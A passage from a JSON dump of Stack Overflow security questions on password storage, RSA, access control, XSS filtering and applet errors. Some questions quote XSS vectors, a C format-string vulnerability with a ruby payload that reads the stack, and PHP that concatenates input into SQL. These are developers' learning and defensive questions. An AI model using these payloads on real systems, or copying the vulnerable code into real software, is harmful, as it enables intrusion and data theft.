words.</p>\n"},{"tags":["c#","security","data","local"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":162,"score":3,"question_id":12657792,"title":"How to securely save username/password (local)","body":"<p>\nI'm making a windows application, which you need to log into first.<br/>\nThe account details consist of username and password, and they need to be saved locally.<br/>\nIt's just a matter of security, so other people using the same computer can't see everyone's personal data.<br/>\n<strong>What is the best/most secure way to save this data?</strong>\n</p>\n\n<p>\n<em>I don't want to use a database, so I tried some things with Resource files.<br/>\nBut since I'm kind of new with this, I'm not entirely sure of what I'm doing and where I should be looking for a solution.</em>\n</p>\n"},{"tags":["php","database","security","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12672274,"title":"Security for a User web application","body":"<p>I've been wondering about the security aspect of my application.\nI'm using CodeIgniter PHP Framework for my project.</p>\n\n<p>I'd like to know some \"expert\" opinions on this.\nI have a login function.\nWhen a user logged in, the session is store in database. I added information like user Id in the information session.\nA user can create a company. But to do that, I first check his account to see if he already has one. \nThis session user Id allows me to run a DB request to find that out.\nFor example :</p>\n\n<pre><code>function create(){\n    $hasCompany = $this-&gt;Accountmodel-&gt;hasCompany($this-&gt;session-&gt;userdata('id'));\n    if($hasCompany){\n        $data['company'] = $this-&gt;Companymodel-&gt;getCompanyInfo($this-&gt;session-&gt;userdata('id');\n        $this-&gt;load-&gt;view('company/panel', $data);\n    }\n    else{\n        $this-&gt;load-&gt;view('company/create');\n    }\n\n}\n</code></pre>\n\n<p>And then if he has one, I can print the company edit/delete panel.\nIt allows me to avoid the use of id parameters in the url like :\nmyserver.com/company/edit/[id]</p>\n\n<p>So to get to the point, I was wondering if, in term of security, this is ok or there is some kind of vulnerability.</p>\n\n<p>Any advices are welcome !</p>\n"},{"tags":["security","homework","cryptography","computer-science","discrete-mathematics"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":160,"score":1,"question_id":1734936,"title":"RSA cryptosystem","body":"<p>Hi i am trying to set up an RSA cryptosystem i have all the values except d selected prime numbers: <code>p=1889</code>, <code>q=2003</code>, <code>n=3783667</code>, <code>phi=3779776</code>, <code>e= 61</code></p>\n\n<p>i got stuck finding d could anyone help me to figure it out?</p>\n\n<p>Setting up an RSA cryptosystem</p>\n\n<ul>\n<li>Two large distinct prime numbers <code>p</code> and <code>q</code> are selected, and <code>n = pq</code> and <code>Φ(n) = (p − 1)(q − 1)</code> are calculated.</li>\n<li><p>An integer <code>e</code> is selected such that <code>gcd(Φ(n), e) = 1</code> and the multiplicative inverse <code>d = e^(−1)</code> in <code>ZΦ(n)</code> is calculated, i.e.</p>\n\n<p>ed ≡ 1 (mod Φ(n)).</p></li>\n<li><p>The numbers <code>p</code>, <code>q</code>, and <code>Φ(n)</code>, are then discarded.</p></li>\n<li>The pair <code>(e, n)</code> is published as the public encryption key</li>\n<li>The number <code>d</code> is the secret decryption key.</li>\n</ul>\n"},{"tags":["security","iis7"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12671307,"title":"Restrict outside users IIS 7","body":"<p>I have IIS 7 where I host websites accessable to the outside world. But I would like 1 specific website just to be viewed within our local network. Can this be done on IIS7?</p>\n\n<p>Thanks,</p>\n"},{"tags":["security","digital-signature"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12420384,"title":"Combined digital signature for checking if majority of signed elements are not changed","body":"<p>I'm not familiar with the field, so please excuse me if the question seems trivial or dull.</p>\n\n<p>I have N strings which I need to sign in such a way, that the signature remains valid if\nup to M strings are changed, removed, or added. N > M, N may vary. The signature should not allow for deducing N from the signature itself.</p>\n\n<p>All I can imagine so far, is a strightforward approach with building hashes for each string separately, and storing them all as signature, but it does not comply with the latest requirement.</p>\n\n<p>If there exist some language specific examples, please mention them as well, - Java, C++, PHP, etc. are OK.</p>\n"},{"tags":["php","security","xss","xss-prevention"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12670501,"title":"Web cruiser is showing XSS vulnerability while the input data is already cleaned and sanitized","body":"<p>Currently I am using Web Cruiser to scan the vulnerability of a particular website which is showing me lots of cross site scripting errors while I have already done with filtering the input data at server side.</p>\n\n<p>At the server side, I have made a function that clears the input data :</p>\n\n<pre><code>function mssql_escape($data) {\n    $filtered_data = filter_var($data, FILTER_SANITIZE_STRING);\n    $secure_class = new security_class(); /* Code igniter Security class */ \n    $clean_data = $secure_class-&gt;xss_clean($filtered_data);                         \n    return $clean_data;\n}\n</code></pre>\n\n<p>My search action page is like this :</p>\n\n<pre><code>if(isset($_POST['reg_no'])&amp;&amp;$_POST['reg_no']!='')\n{\n  $reg = filter_var($_POST[reg_no], FILTER_SANITIZE_NUMBER_INT);\n  $sql.= \" and C.REGISTRATION_NO like '\".mssql_escape($reg).\"' \";    \n}           \nif(isset($_POST['company_name'])&amp;&amp;$_POST['company_name']!='')\n{           \n  $comp_name = mssql_escape($_POST[company_name]);          \n  $sql.= \" and C.ENGLISH_NAME like '%\".$comp_name.\"%' \";    \n}\n</code></pre>\n\n<p>My form is like this :</p>\n\n<pre><code>&lt;tr&gt;\n    &lt;td&gt;Registration No.&lt;/td&gt;\n    &lt;td colspan=\"2\"&gt;&lt;input type=\"text\" name=\"reg_no\" id=\"reg_no\" value=\"&lt;?php echo mssql_escape($_POST['reg_no']) ?&gt;\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n    &lt;td&gt;Company Name&lt;/td&gt;\n    &lt;td colspan=\"2\"&gt;&lt;input type=\"text\" name=\"company_name\" id=\"company_name\" value=\"&lt;?php echo isset($_POST['company_name'])?mssql_escape($_POST['company_name']):'' ?&gt;\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n</code></pre>\n\n<p>Now, please help me find out my fraud thats why the web cruiser is finding the cross site scripting vulnerability from this page. Thanks in advance.</p>\n"},{"tags":["security","mongodb","symfony2","doctrine2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12666155,"title":"Can't use a Doctrine repository as user provider","body":"<p>I'm trying to create a <a href=\"http://symfony.com/doc/master/cookbook/security/custom_provider.html\" rel=\"nofollow\">custom user provider</a>.</p>\n\n<p>I defined my <code>UserProvider</code> as a service:</p>\n\n<pre><code>myvendor.user_provider:\n  class: MyVendor\\UserBundle\\Service\\Security\\UserProvider\n</code></pre>\n\n<p>This class is a <code>DocumentRepository</code>:</p>\n\n<pre><code>namespace MyVendor\\UserBundle\\Service\\Security;\n\nuse Symfony\\Component\\Security\\Core\\User\\UserInterface;\nuse Symfony\\Component\\Security\\Core\\User\\UserProviderInterface;\nuse Symfony\\Component\\Security\\Core\\Exception\\UsernameNotFoundException;\nuse Symfony\\Component\\Security\\Core\\Exception\\UnsupportedUserException;\nuse Doctrine\\ODM\\MongoDB\\DocumentRepository;\nuse Doctrine\\ODM\\MongoDB\\DocumentNotFoundException;\n\nclass UserProvider extends DocumentRepository implements UserProviderInterface {\n    //public function loadUserBy...\n}\n</code></pre>\n\n<p>But I get this error:</p>\n\n<pre><code>Catchable Fatal Error: Argument 1 passed to Doctrine\\ODM\\MongoDB\\DocumentRepository::__construct() must be an instance of Doctrine\\ODM\\MongoDB\\DocumentManager, none given, called in /home/www/dev/public/myapp/app/cache/dev/appDevDebugProjectContainer.php on line 258 and defined in /home/www/dev/public/myapp/vendor/doctrine/mongodb-odm/lib/Doctrine/ODM/MongoDB/DocumentRepository.php line 68 \n</code></pre>\n\n<p>Seems like the document manager has not been created yet at that point, because I also tried injecting it, but it complains about its own dependencies, like the <code>UnitOfWork</code>.</p>\n\n<p>What can I do?</p>\n"},{"tags":["php","security","joomla","joomla2.5"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12661626,"title":"Joomla's template override and security","body":"<p>So whenever you need to make a change to a component, module, etc you're supposed to use an override so that it won't be altered on future core updates.</p>\n\n<p>Could those overrides be a security risk as the base code is now older as you update the core?  I've never seen any mention of updating the overrides with new updates.</p>\n"},{"tags":["facebook","security","web-security","facebook-apps"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12660425,"title":"Security Alert for links published by our App and on links pasted on Fan Page","body":"<p>I am seeing security alert with the following message:</p>\n\n<p>\"The link you are trying to visit has been classified as potentially abusive by a Facebook partner. To learn more about staying safe on the Internet, visit Facebook's Security Page\"</p>\n\n<p>On siteadvisor, it says:</p>\n\n<p>\"We've tested millions of websites, but we haven't tested this one yet. Be the first one to submit feedback on it!\"</p>\n\n<p>I have a facebook app and I am unable to even go to the app via the Fan Page of my app. This is really annoying and I have no clue how to fix this. I have tried contacting Facebook as well but I am not sure if they will respond.</p>\n"},{"tags":["sql-server","security","ssas"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12662114,"title":"Secured views in SQL Server Analysis Services","body":"<p>We have an SSAS 2012 instance containing a series of measure tables and dimension tables. One of the dimension tables relates to a client and serves to organise information by client.</p>\n\n<p>Recently we were given the requirement that one client should be secured from view from another, i.e, users would be given 'access' to a given client and can therefore only view that client's data. </p>\n\n<p>I wondered what the best way or achieving this goal would be. Currently anyone could create a pivot in excel for any client. I can only see the possibility of creating and securing seperate databases and ultimately separate cubes for each client.</p>\n\n<p>Any advice would be greatly appreciated.</p>\n"},{"tags":["html","security","unicode","syntax","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":123,"score":4,"question_id":12662908,"title":"What type of syntax is \"%u00AB\"?","body":"<p>In <a href=\"http://www.barracudalabs.com/wordpress/index.php/2009/06/05/unicode-encoding-for-bypassing-xss-filters/\" rel=\"nofollow\">this</a> article, I'm warned of an XSS attack vector <code>\"%u00ABscript%u00BB\"</code>.  I'm wondering what type of syntax <code>\"%u00AB\"</code> is.  In my brief tests on Chromium, it doesn't actually get rendered into a tag, leading me to believe that the syntax is used by either an SQL engine, or a server side programming language.  I'm not concerned with stored/reflected XSS, only DOM-based ones.  I don't recognize it though, so maybe its like ruby or python or something?</p>\n\n<p>Also, does anyone know if its an issue in other browsers? I only tested Chromium, but perhaps other versions and browsers behave differently and are therefore vulnerable.</p>\n"},{"tags":["database","security","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12662122,"title":"Securing Credentials for DB access","body":"<p>I need ensure the data safety (no unwanted reading or writing) in a software that will be running in the user machine (both application and database). </p>\n\n<p>I know for sure that storing the DB credentials hardcoded isn't a good one, but in this scenario it seems I am running short of alternatives.\nIf I can't avoid this, is there a way PostgreSQL will keep an access log safe from user modification?</p>\n\n<p>What is the best approach to avoid user access to a database stored in its own machine?</p>\n"},{"tags":["ruby-on-rails","security","devise","cancan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12663531,"title":"Security: using CanCan to make sure user cannot see other users' profiles","body":"<p>I've got an app that uses Devise, CanCan and Rolify to deal with authentication and authorization.  But I don't think I'm using these gems to the full extent.  Right now the only thing in my ability class is this:</p>\n\n<pre><code>class Ability\n\n  include CanCan::Ability\n\n  def initialize(user)\n    user ||= User.new # guest user (not logged in)\n    if user.has_role? :admin\n      can :manage, :all\n    else\n      can :read, :all\n    end\n  end\nend\n</code></pre>\n\n<p>I found a security hole where an authenticated user is able to look at other user profiles.  I fixed it by changing some code in the user controller.</p>\n\n<pre><code>def show\n  @user = current_user.has_role?(:admin) ? User.find(params[:id]) : current_user\nend\n</code></pre>\n\n<p>Is this the best way to deal with this hole?  Is there a best practice or a rails convention that addresses this in a different way?</p>\n"},{"tags":["security","jsf","java-ee","java-ee-6","jdbcrealm"],"answer_count":0,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12658078,"title":"JEE Security Roles in the EJB Container and how they Propagate From and/or Relate to the Web Container","body":"<p>I did a test the other day on an app I'm working on. I wanted to see how the security propagated from web tier to JEE container. I wrote a quick couple of pages, a backing bean and an EJB stateless bean to do this. I set it up so I could log in and check what the principal and roles I was in on the web tier and on the EJB container. </p>\n\n<p>The call to the EJB context said that I had the same principal as the call through the Faces Context. However, while the web tier reported (getRole) confirmed as expected that I was in the groups set up in the database, the call to the EJB side failed and raised an exception. Basically it said it could find there were no groups like I was asking it about configured in its context. And indeed, I have done no security configuration on the EJB side.</p>\n\n<p>I seem to missing something here. What do I need in order make sure that both sides are in sync in terms of roles/groups. I have configured the web side such that it maps the users to groups via the JDBC realm (that is not custom that is a standard configuration option).</p>\n\n<p>Note that I am on Glassfish 3.1.1 and I created a customized JDBC Realm to match my groups to my users in what I think is a cleaner way (i.e. using a lookup table in between). FWIW, I have been around in software for a long while, but just getting used to full stack JEE (about a year). </p>\n"},{"tags":["c#","database","security","encryption","obfuscation"],"answer_count":3,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":4275,"score":8,"question_id":619921,"title":"How do you hide an encryption key in a .NET application?","body":"<p>I'm developing an intranet application (C#) that uses some data (local to the web server) that we'd like to keep private. This data is encrypted (AES) using a legacy data repository. We can't totally prevent physical access to the machine.</p>\n\n<p>Clearly, we're never going to have perfect security here. However, we want to make it as hard as possible for anyone to gain unauthorized access to the data.</p>\n\n<p>The question is how best to store the key. Encrypting it based on some machine specific ID is an option, but that information would be readily available to anyone running a diagnostic tool on the machine.</p>\n\n<p>Encoding it in the application is an option (it's a one off application). However, .NET assemblies are pretty easy to decompile. So, would it be best to obfuscate it, use an encryption launcher, compile it?</p>\n\n<p>Or is there an option I'm missing?</p>\n\n<p>Just so we're clear, I know it's pretty much a lost cause if someone is determined, but we're looking to make it as hard as possible within the constraints.</p>\n"},{"tags":["python","security","eval"],"answer_count":6,"favorite_count":6,"up_vote_count":10,"down_vote_count":0,"view_count":3219,"score":10,"question_id":661084,"title":"Security of Python's eval() on untrusted strings?","body":"<p>If I am evaluating a Python string using eval(), and have a class like:</p>\n\n<pre><code>class Foo(object):\n    a = 3\n    def bar(self, x): return x + a\n</code></pre>\n\n<p>What are the security risks if I do not trust the string? In particular:</p>\n\n<ol>\n<li>Is <code>eval(string, {\"f\": Foo()}, {})</code> unsafe? That is, can you reach os or sys or something unsafe from a Foo instance?</li>\n<li>Is <code>eval(string, {}, {})</code> unsafe? That is, can I reach os or sys entirely from builtins like len and list?</li>\n<li>Is there a way to make builtins not present at all in the eval context?</li>\n</ol>\n\n<p>There are some unsafe strings like \"[0] * 100000000\" I don't care about, because at worst they slow/stop the program. I am primarily concerned about protecting user data external to the program.</p>\n\n<p>Obviously, <code>eval(string)</code> without custom dictionaries is unsafe in most cases.</p>\n"},{"tags":["c","security","openssl","rsa","pem"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":187,"score":3,"question_id":12647220,"title":"Reading and writing rsa keys to a pem file in C","body":"<p>I am writing a C program to generate keys for RSA and write them to a file and then read from them. The homework requires me to generate the files in a openssl format. So, I chose PEM. Now, I have the following function for creating the file</p>\n\n<pre><code>rsa = RSA_new();\n// These 3 keys are generated beforehand\nrsa-&gt;e = e;\nrsa-&gt;n = n;\nrsa-&gt;d = d;\n\nfp = fopen(pubkey_file, \"w\");\nif(!PEM_write_RSAPublicKey(fp, rsa))\n{\n    printf(\"\\n%s\\n\", \"Error writing public key\");\n}\nfflush(fp);\nfclose(fp);\n\nfp = fopen(privkey_file, \"w\");\n// pRsaKey = EVP_PKEY_new();\n// EVP_PKEY_assign_RSA(pRsaKey, rsa);\nif(!PEM_write_RSAPrivateKey(fp, rsa, NULL, 0, 0, NULL, NULL))\n// if (!PEM_write_PrivateKey(fp, pRsaKey, NULL, NULL, 0, 0, NULL))\n{\n    printf(\"\\n%s\\n\", \"Error writing private key\");\n}\nfflush(fp);\nfclose(fp);\n</code></pre>\n\n<p>And this is the function to read the files</p>\n\n<pre><code>rsa = RSA_new();\nfp = fopen(pubkey_file, \"r\");\nif(PEM_read_RSAPublicKey(fp, &amp;rsa, NULL, NULL) == NULL)\n{\n    printf(\"\\n%s\\n\", \"Error Reading public key\");\n    return;\n}\n\nfclose(fp);\nBN_bn2bin(rsa-&gt;n, (unsigned char *)modulus);\nBN_bn2bin(rsa-&gt;e, (unsigned char *)exp);\nprintf(\"\\n%s\\n%s\\n\", exp, modulus);\nRSA_free(rsa);\n\n// pRsaKey = EVP_PKEY_new();\nfp = fopen(privkey_file, \"r\");\nif(fp)\n    // if((PEM_read_PrivateKey(fp, &amp;pRsaKey, NULL, NULL)) == NULL)\n    if((PEM_read_RSAPrivateKey(fp, &amp;rsa, NULL, NULL)) == NULL)\n    {\n        printf(\"\\n%s\\n\", \"Error Reading private key\");\n        return;\n    }\n// rsa = RSA_new();\n// rsa = EVP_PKEY_get1_RSA(pRsaKey);\nfclose(fp);\n</code></pre>\n\n<p>The public key is written and read as required, but the provate key fails. I have tried writing using both the rsa and the evp(which is commented in the above code). But, both fail. I cannot get my head around why this is happening or try and find where to look to debug this issue. Can anyone please provide some pointers for this?</p>\n"},{"tags":["python","security","permissions","execute"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12660787,"title":"Execution permissions in Python","body":"<p>I need to send code to remote clients to be executed in them but security is a concern for me right now. I don't want unsafe code to be executed there so I would like to control what a program is doing. I mean for example, know if is making connections, where is connecting to, if is reading local files, etc. Is this possible with Python?</p>\n\n<p>EDIT: I'm thinking in something similar to Android permission system. I want to know what a code will do and if it does something different, stop it.</p>\n"},{"tags":["java","spring","security","authentication","spring-security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12659728,"title":"Spring security Saved URL RequestCache does not store # (hash)","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/317760/how-to-get-url-hash-from-server-side\">How to get Url Hash (#) from server side</a>  </p>\n</blockquote>\n\n\n\n<p>I am using Spring security to protect resources on our application. Unfortunately, spring does not store the full url's that include a # . E.g.:</p>\n\n<pre><code>example.com/account/file#1234\n</code></pre>\n\n<p>The <code>#1234</code> is not stored in the request cache before being redirected to the login page and the security process. Once returned from authentication, the url redirected to is :</p>\n\n<pre><code>example.com/account/file\n</code></pre>\n\n<p>Is there any way to make spring store the full url?</p>\n"},{"tags":["javascript","html","security","xss","img"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12658992,"title":"Why are javascript: URIs allowed in the src attribute of <img> tags?","body":"<p>On practically every XSS mitigation guide I've seen, the following pattern is mentioned:</p>\n\n<pre><code>&lt;img src=\"javascript:evil();\"&gt;\n</code></pre>\n\n<p>What legitimate use could this possibly have?  Can you use JS code to generate a base64-encoded representation or something?</p>\n"},{"tags":["php","security","validation","base64"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12658661,"title":"Validating base64 encoded images","body":"<p>I'm building an application that allows the user to <code>POST</code> HTML5 canvas data that is then encoded in base64 and displayed to all users. I am considering parsing the data into an actual .png file and storing on the server, but the base64 route allows me to store the images in a database and minimize requests. The images are unique, few, and the page won't be refreshed often.</p>\n\n<p>A bit of jQuery will take the canvas data, <code>data:image/png;base64,iVBORw...</code> and passes it along to a PHP script that wraps it like so: <code>&lt;img src=\"$data\"&gt;&lt;/img&gt;</code></p>\n\n<p>However, security is cornerstone and need to validate the base64 canvas data to prevent passing malicious data in the <code>POST</code> request. My primary concern is to prevent external URLs from being injected into the <code>&lt;img&gt;</code> tag and being requested on page load.</p>\n\n<p>I currently have a setup like this:</p>\n\n<pre><code>$data = (isset($_POST['canvas']) &amp;&amp; is_string($_POST['canvas'])) ? $_POST['canvas'] : null;\n$base = str_replace('data:image/png;base64,', '', $data);\n$regx = '~^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$~'\n\nif ((substr($data, 0, 22)) !== 'data:image/png;base64,')\n{\n  // Obviously fake, doesn't contain the expected first 22 characters.\n  return false;\n}\n\nif ((base64_encode(base64_decode($base64, true))) !== $base64)\n{\n  // Decoding and re-encoding the data fails, something is wrong\n  return false;\n}\n\nif ((preg_match($regx, $base64)) !== 1) \n{\n  // The data doesn't match the regular expression, discard\n  return false;\n}\n\nreturn true;\n</code></pre>\n\n<p>I want to make sure my current setup is safe enough to prevent external URLs from being inserted into the <code>&lt;img&gt;</code> tag, and if not, what can be done to further validate the image data?</p>\n"},{"tags":["security","gwt","csrf","gwt-rpc"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4304,"score":7,"question_id":2609834,"title":"GWT RPC - Does it do enough to protect against CSRF?","body":"<p><strong>UPDATE</strong> : GWT 2.3 introduces a better mechanism to fight XSRF attacks. See <a href=\"http://code.google.com/webtoolkit/doc/latest/DevGuideSecurityRpcXsrf.html\" rel=\"nofollow\">http://code.google.com/webtoolkit/doc/latest/DevGuideSecurityRpcXsrf.html</a></p>\n\n<hr/>\n\n<p>GWT's RPC mechanism does the following things on every HTTP Request - </p>\n\n<ol>\n<li>Sets two custom request headers - X-GWT-Permutation and X-GWT-Module-Base</li>\n<li>Sets the content-type as text/x-gwt-rpc; charset=utf-8</li>\n</ol>\n\n<p>The HTTP request is always a POST, and on server side GET methods throw an exception (method not supported). </p>\n\n<p>Also, if these headers are not set or have the wrong value, the server fails processing with an exception \"possibly CSRF?\" or something to that effect.</p>\n\n<p>Question is : Is this sufficient to prevent CSRF? Is there a way to set custom headers and change content type in a pure cross-site request forgery method?</p>\n"},{"tags":["c","security","format-string"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12657246,"title":"How do I use formatstring to print out a string?","body":"<p>I'm going through tutorials on formatstring vulnerabilities to learn how to code more securely. The program I've written so far is as follows:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[]) {\n    char text[100];\n    strcpy(text, argv[1]);\n\n    printf(text);\n}\n</code></pre>\n\n<p>I'm running it like this:</p>\n\n<pre><code>&gt;&gt;&gt; ./foo $(ruby -e 'print \"AAAA\" + \"%08x.\"*9 + \"%x\"')\nAAAAffe466f4.00000001.f763b1c9.ffe458df.ffe458de.00000000.ffe459c4.ffe45964.00000000.41414141\n</code></pre>\n\n<p>I can see the \"41414141\" at the end, which is the AAAA at the beginning of the string. However, when I use \"%s\" instead like so:</p>\n\n<pre><code>&gt;&gt;&gt; ./foo $(ruby -e 'print \"AAAA\" + \"%08x.\"*9 + \"%s\"')\n</code></pre>\n\n<p>I get a segfault. Can anyone point me in the right direction?</p>\n"},{"tags":["security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12655575,"title":"Encrypting text","body":"<p>I'm wondering if it's possible to encrypt text client side.</p>\n\n<p>The situation is that I have a block of text I want to encrypt, and then save the encrypted text to a file. Only after a certain amount of time has passed will my program decrypt it. Another requirement I have is to be able to transfer the file with the encrypted text and be able to decrypt it with other copies of my program on various machines.</p>\n\n<p>The problem is where to store the key. The only implementation I can think of that would work is if I store the key server side, and have it return the key after a certain time has passed.</p>\n\n<p>Is there a way to do this client side (i.e. without any internet access)?</p>\n"},{"tags":["java","security","exception","applet"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1263,"score":1,"question_id":12648798,"title":"Java: Security Exception - illegal url redirect","body":"<p>Has anyone encountered this before? It's causing me alot of trouble getting an appplet working. The reason I think it's not working is due to the socket that is in my program to communicate with a server. However, I cannot figure out how to stop it, and google isn't helping. I can't get an exception because the java console for google chrome isn't outputting the error, only giving me a popup after clicking the errored-applet saying that it errored. If code is needed, i will add. Thanks ahead of time.</p>\n\n<pre><code>security:  --- parseCommandLine converted : -Djava.net.preferIPv4Stack=true\ninto:\n[-Djava.net.preferIPv4Stack=true]\nbasic: Added progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892\nbasic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/DatRLTest.jar\nbasic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/SharedClasses.jar\nsecurity: Blacklist revocation check is enabled\nsecurity: Trusted libraries list check is enabled\nnetwork: Cache entry found [url: http://voidchar.com/Other/DatRLTest.jar, version: null] prevalidated=false/0\ncache: Resource http://voidchar.com/Other/DatRLTest.jar has expired.\nnetwork: Connecting http://voidchar.com/Other/DatRLTest.jar.pack.gz with proxy=DIRECT\nnetwork: Connecting http://voidchar.com:80/ with proxy=DIRECT\nbasic: exception: illegal URL redirect.\njava.lang.SecurityException: illegal URL redirect\nat com.sun.deploy.net.HttpUtils.followRedirects(Unknown Source)\nat com.sun.deploy.net.BasicHttpRequest.doRequest(Unknown Source)\nat com.sun.deploy.net.BasicHttpRequest.doGetRequestEX(Unknown Source)\nat com.sun.deploy.cache.ResourceProviderImpl.checkUpdateAvailable(Unknown Source)\nat com.sun.deploy.cache.ResourceProviderImpl.isUpdateAvailable(Unknown Source)\nat com.sun.deploy.cache.DeployCacheHandler.get(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.plainConnect(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.connect(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)\nat sun.plugin.PluginURLJarFileCallBack.downloadJAR(Unknown Source)\nat sun.plugin.PluginURLJarFileCallBack.access$000(Unknown Source)\nat sun.plugin.PluginURLJarFileCallBack$1.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat sun.plugin.PluginURLJarFileCallBack.retrieve(Unknown Source)\nat sun.net.www.protocol.jar.URLJarFile.retrieve(Unknown Source)\nat sun.net.www.protocol.jar.URLJarFile.getJarFile(Unknown Source)\nat sun.net.www.protocol.jar.JarFileFactory.get(Unknown Source)\nat sun.net.www.protocol.jar.JarURLConnection.connect(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.connect(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFileInternal(Unknown Source)\nat sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFile(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.getJarFile(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.access$1000(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader$1.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.ensureOpen(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$JarLoader.&lt;init&gt;(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath$3.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)\nat com.sun.deploy.security.DeployURLClassPath.getResource(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader$2.run(Unknown Source)\nat java.security.AccessController.doPrivileged(Native Method)\nat sun.plugin2.applet.Plugin2ClassLoader.findClassHelper(Unknown Source)\nat sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\nat java.lang.ClassLoader.loadClass(Unknown Source)\nat sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)\nat sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)\nat sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)\nat java.lang.Thread.run(Unknown Source)\nIgnored exception: java.lang.SecurityException: illegal URL redirect\nbasic: Dialog type is not candidate for embedding\nbasic: Removed progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892\nbasic: Loading Java Applet Failed...\nsecurity: Accessing keys and certificate in Mozilla user profile: null\nsecurity: Reset deny session certificate store\n</code></pre>\n\n<p>Edit: Here's the html code I'm using to load the applet.</p>\n\n<pre><code>\n    {applet width=800 height=800 archive='DatRLTest.jar,SharedClasses.jar'    code='vc.voidwhisperer.datrl.main'}\n    {PARAM name=\"java_arguments\" value=\"-Djava.net.preferIPv4Stack=true\"}\n    {/applet}\n</code></pre>\n\n<p>The less than &amp; greater than signs were replaced due to the fact that it didn't like me attempting to put something with them.</p>\n\n<p>Edit #2: I have self-signed the jar, this is still happening. I still have yet to figure out how to solve this..</p>\n\n<p>Final edit: After many hours of working on this, I have finally come across a solution, thanks to a friend in an irc channel. Here's the general gist of how it was fixed:</p>\n\n<ul>\n<li>If you look at a specific line of the output: network: Connecting <a href=\"http://voidchar.com/Other/DatRLTest.jar.pack.gz\" rel=\"nofollow\">http://voidchar.com/Other/DatRLTest.jar.pack.gz</a> with proxy=DIRECT.</li>\n<li>Upon looking for that file it didn't exist. </li>\n<li>Doing some research into the file type, it's a pack200 jar which can be made using a jar and then doing the following with it: 